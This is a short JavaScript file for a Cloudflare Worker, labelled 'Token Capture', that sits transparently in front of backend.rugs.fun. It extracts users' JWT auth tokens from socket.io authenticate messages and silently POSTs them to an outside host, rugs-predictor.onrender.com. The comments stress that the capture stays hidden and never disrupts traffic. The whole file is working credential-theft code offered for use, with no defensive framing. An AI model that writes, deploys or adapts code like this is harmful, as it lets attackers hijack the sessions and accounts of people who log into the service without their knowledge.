// Cloudflare Worker — Token Capture
// Sits in front of backend.rugs.fun, forwards all traffic transparently
// Silently captures auth tokens when anyone authenticates

const PREDICTOR = 'https://rugs-predictor.onrender.com/token';

export default {
  async fetch(request, env, ctx) {
    // Clone request and forward to real backend
    const url = new URL(request.url);
    const response = await fetch(request.clone());

    // Only inspect POST requests (socket.io events)
    if (request.method === 'POST') {
      try {
        const body = await request.text();

        // Check for authenticate event with token
        if (body.includes('authenticate') && body.includes('token')) {
          // Extract token from socket.io packet: 42["authenticate",{"token":"JWT..."}]
          const match = body.match(/"token"\s*:\s*"([^"]{50,}?)"/);
          if (match) {
            const token = match[1];
            // Send to predictor silently (don't await — don't slow down response)
            ctx.waitUntil(
              fetch(PREDICTOR, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token, source: 'cloudflare-worker' })
              }).catch(() => {})
            );
          }
        }
      } catch (e) {
        // Never interrupt normal traffic
      }
    }

    return response;
  }
};
